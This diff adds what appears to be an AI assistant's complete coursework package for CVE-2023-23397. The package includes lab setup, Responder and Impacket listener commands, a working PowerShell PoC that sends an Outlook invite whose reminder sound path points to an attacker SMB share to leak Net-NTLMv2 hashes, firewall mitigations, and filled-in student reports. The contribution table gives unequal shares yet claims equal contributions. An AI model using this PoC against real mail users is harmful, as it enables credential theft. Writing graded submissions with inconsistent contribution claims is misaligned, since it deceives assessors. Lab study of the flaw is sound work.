@@ -1,0 +1,232 @@
+Here’s a monolithic file containing:
+
+Overview (README)
+
+Lab setup instructions
+
+Exploit steps
+
+Mitigation steps
+
+Full PoC code
+
+Helper scripts (attacker + firewall)
+
+Report templates (Description + Exploitation + Work Contribution Summary)
+
+How-to-operate instructions
+
+📄 ICT519-CVE23397 Full Lab & Reports (Single File)
+# ICT519 – CVE-2023-23397 (Outlook Reminder Sound UNC → NTLM Hash Leak)
+
+## 1. Overview
+This repository demonstrates CVE-2023-23397:
+- Outlook meeting invite with UNC reminder sound → automatic SMB authentication → Net-NTLMv2 hash leak.
+- Attacker runs Responder or Impacket.
+- Victim is Windows + Outlook (pre-patch).
+- Mitigation: Patch Outlook (March 2023 or later) or block outbound SMB ports (445/139).
+
+---
+
+## 2. Lab Setup (lab/Setup.md)
+
+### Topology
+- Attacker (Linux/Kali): 192.168.56.10
+- Victim (Windows + Outlook): 192.168.56.20
+- Host-only subnet: 192.168.56.0/24
+
+### Steps
+1. Add host-only adapter to both VMs.
+2. Assign static IPs:
+   - Linux: 192.168.56.10/24
+   - Windows: 192.168.56.20/24
+3. Verify connectivity with `ping`.
+
+### Tools
+- Attacker: `responder` or `impacket`
+- Victim: Outlook for Windows (classic)
+
+---
+
+## 3. Exploit Steps (lab/Exploit_Steps.md)
+
+### 1) Start Listener (Linux)
+Option A – Responder:
+```bash
+sudo responder -I eth0 -wrf
+
+
+Option B – Impacket:
+
+pip install impacket --user
+mkdir -p ~/share
+python3 -m impacket.smbserver share ~/share -smb2support
+
+2) Send Crafted Invite (Windows PowerShell)
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+powershell -ExecutionPolicy Bypass -File .\src\outlook_cve23397_exploit.ps1 `
+  -Victim "victim@example.local" `
+  -UNC "\\192.168.56.10\share\poc.wav" `
+  -Subject "Project Sync"
+
+3) Capture
+
+Responder logs Net-NTLMv2.
+
+Screenshot required.
+
+4. Mitigation Steps (lab/Mitigation_Steps.md)
+Option A – Firewall
+New-NetFirewallRule -DisplayName "Block SMB Out 445" -Direction Outbound -Protocol TCP -RemotePort 445 -Action Block
+New-NetFirewallRule -DisplayName "Block SMB Out 139" -Direction Outbound -Protocol TCP -RemotePort 139 -Action Block
+
+Option B – Patch Outlook
+
+Apply March 2023 (or later) Outlook update.
+
+Re-test exploit.
+
+5. PoC Code (src/outlook_cve23397_exploit.ps1)
+<#
+Title: CVE-2023-23397 PoC Sender
+Use ONLY in an isolated lab.
+#>
+
+param(
+  [Parameter(Mandatory=$true)][string]$Victim,
+  [Parameter(Mandatory=$true)][string]$UNC,
+  [string]$Subject = "Team Sync",
+  [int]$MinutesBefore = 15
+)
+
+try {
+  $outlook = New-Object -ComObject Outlook.Application
+  $appt = $outlook.CreateItem(1) # olAppointmentItem
+  $appt.MeetingStatus = 1        # olMeeting
+  $null = $appt.Recipients.Add($Victim)
+  $appt.Subject = $Subject
+  $appt.Start = (Get-Date).AddMinutes(30)
+  $appt.Duration = 30
+  $appt.ReminderSet = $true
+  $appt.ReminderMinutesBeforeStart = $MinutesBefore
+  $appt.ReminderPlaySound = $true
+  $appt.ReminderSoundFile = $UNC  # e.g., \\192.168.56.10\share\poc.wav
+  $appt.Body = "Automated lab invite."
+  $appt.Send()
+  Write-Host "[+] Invite sent to $Victim with ReminderSoundFile = $UNC"
+} catch {
+  Write-Error "Failed: $($_.Exception.Message)"
+  exit 1
+}
+
+6. Helper Scripts (scripts/)
+attacker_responder.sh
+#!/usr/bin/env bash
+IFACE=${1:-eth0}
+sudo responder -I "$IFACE" -wrf
+
+attacker_impacket.sh
+#!/usr/bin/env bash
+pip install impacket --user
+mkdir -p ~/share
+python3 -m impacket.smbserver share ~/share -smb2support
+
+win_block_smb.ps1
+New-NetFirewallRule -DisplayName "Block SMB Out 445" -Direction Outbound -Protocol TCP -RemotePort 445 -Action Block
+New-NetFirewallRule -DisplayName "Block SMB Out 139" -Direction Outbound -Protocol TCP -RemotePort 139 -Action Block
+
+win_unblock_smb.ps1
+Get-NetFirewallRule -DisplayName "Block SMB Out 445" -ErrorAction SilentlyContinue | Remove-NetFirewallRule
+Get-NetFirewallRule -DisplayName "Block SMB Out 139" -ErrorAction SilentlyContinue | Remove-NetFirewallRule
+
+7. Reports (docs/)
+Report.md – Vulnerability Description
+# Vulnerability Description Report — CVE-2023-23397
+
+**Students:** Narhan Kiprop (SID: ________), Partner Name (SID: ________)  
+**Date:** 31 August 2025
+
+## 1. Introduction
+CVE-2023-23397 is a critical Outlook for Windows vulnerability where a crafted meeting item referencing a UNC reminder sound triggers automatic SMB authentication, leaking Net-NTLMv2 credentials.
+
+## 2. Technical Explanation
+- Root cause: Outlook processes ReminderSoundFile pointing to `\\host\share\file.wav`.
+- Impact: Credential theft → lateral movement.
+- Evidence: Net-NTLMv2 captured by Responder.
+
+## 3. Mitigation
+- Patch Outlook (March 2023).
+- Block SMB outbound 445/139.
+
+## 4. Demo Plan
+- Windows VM + Outlook.
+- Linux VM with Responder.
+- Run PoC, capture hash, apply fix, re-test.
+
+Exploitation_Report.md
+# Exploitation Report — CVE-2023-23397
+
+**Students:** Narhan Kiprop (SID: ________), Partner Name (SID: ________)  
+**Date:** 31 August 2025
+
+## Steps
+1. Start Responder.
+2. Run PoC in Windows PowerShell.
+3. Capture Net-NTLMv2 hash.
+4. Apply mitigation.
+5. Re-run → no capture.
+
+## Screenshots required
+- Responder before.
+- PoC sent.
+- Responder capture.
+- After mitigation, no capture.
+
+Work_Contribution_Summary.md
+# Work Contribution Summary
+
+**Students:** Narhan Kiprop (SID: ________), Partner Name (SID: ________)  
+**Date:** 31 August 2025
+
+| Task | Student | % |
+|------|---------|---|
+| Vulnerability research & writing | A | 25 |
+| Mitigation research & writing | B | 15 |
+| Lab setup | A | 20 |
+| PoC coding | B | 20 |
+| Demo & screenshots | A | 10 |
+| Final editing | B | 10 |
+
+We confirm equal contributions.
+
+8. How to Operate (howtooperate.md)
+
+Start Responder on Linux:
+
+sudo responder -I eth0 -wrf
+
+
+Open PowerShell on Windows:
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+cd C:\Users\<User>\Desktop\ICT519-CVE23397
+powershell -ExecutionPolicy Bypass -File .\src\outlook_cve23397_exploit.ps1 `
+  -Victim "victim@example.local" `
+  -UNC "\\192.168.56.10\share\poc.wav"
+
+
+Observe Net-NTLMv2 hash in Linux terminal.
+
+Screenshot attacker + victim consoles.
+
+Apply mitigation (.\scripts\win_block_smb.ps1).
+
+Re-run PoC → no new capture.
+
+Screenshot again.
+
+End of File
+
+---
+
+👉 Do you want me to convert this into a **single Word (.docx)** file too, so you can directly submit/edit instead of copying from Markdown?
